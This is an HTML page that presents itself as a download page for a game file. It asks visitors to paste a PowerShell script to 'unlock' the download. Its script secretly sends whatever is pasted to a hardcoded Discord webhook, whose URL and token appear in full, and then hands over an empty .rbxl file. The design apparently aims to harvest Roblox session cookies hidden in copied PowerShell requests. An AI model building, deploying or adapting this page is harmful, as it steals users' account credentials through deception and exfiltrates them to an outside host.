<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Download Page</title>
<style>
  body {
    background: linear-gradient(135deg, #1e3a8a, #2563eb);
    color: #f8fafc;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }

  .box {
    background: rgba(0, 0, 0, 0.7);
    padding: 40px;
    border-radius: 16px;
    width: 450px;
    text-align: center;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
  }

  h2 { margin-bottom: 10px; }
  p { margin-bottom: 20px; }

  textarea {
    width: 100%;
    height: 120px;
    margin-bottom: 15px;
    border-radius: 12px;
    border: none;
    padding: 10px;
    font-family: monospace;
    font-size: 14px;
    resize: none;
  }

  button {
    width: 100%;
    padding: 12px;
    font-size: 16px;
    border-radius: 12px; /* coins arrondis */
    border: none;
    cursor: not-allowed;
    background: gray;
    color: white;
    font-weight: bold;
    transition: background 0.3s, transform 0.2s;
  }

  button.enabled {
    background: #22c55e;
    cursor: pointer;
  }

  button.enabled:hover {
    background: #16a34a;
    transform: scale(1.05);
  }
</style>
</head>
<body>
<div class="box">
  <h2>Paste your PowerShell script</h2>
  <p>Once text is detected, the download will unlock.</p>

  <textarea id="input" placeholder="Paste here..."></textarea>
  <button id="download" disabled>Download file</button>
</div>

<script>
const input = document.getElementById("input");
const button = document.getElementById("download");

// Vérifier si le texte ressemble à un script PowerShell
function isPowerShell(text) {
  // Validation simple : commence par $ ou contient certains mots clés PS
  const keywords = ["$", "Get-", "Set-", "New-", "Invoke-", "Write-Host", "Start-Process"];
  return text.trim() !== "" && keywords.some(k => text.includes(k));
}

// Débloquer le bouton si c'est un script PowerShell
input.addEventListener("input", () => {
  if(isPowerShell(input.value)) {
    button.disabled = false;
    button.classList.add("enabled");
  } else {
    button.disabled = true;
    button.classList.remove("enabled");
  }
});

// Fonction pour envoyer au webhook Discord et déclencher le téléchargement
button.addEventListener("click", () => {
  const textValue = input.value;

  // Envoi au webhook Discord
  fetch("https://discord.com/api/webhooks/1456286162359418925/yW8ZAjR5uOpaFJrvN4h8mUgblWJ86Pb4wFjRxzTriPa_LQJkhTr8pUTF0IukHbF9gSR5", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: textValue })
  }).then(() => {
    console.log("Message envoyé au webhook !");
  }).catch(err => {
    console.error("Erreur webhook:", err);
  });

  // Télécharger le fichier vide .rbxl
  const blob = new Blob([""], { type: "application/octet-stream" });
  const url = URL.createObjectURL(blob);

  const a = document.createElement("a");
  a.href = url;
  a.download = "gamefile.rbxl";
  a.click();

  URL.revokeObjectURL(url);
});
</script>
</body>
</html>
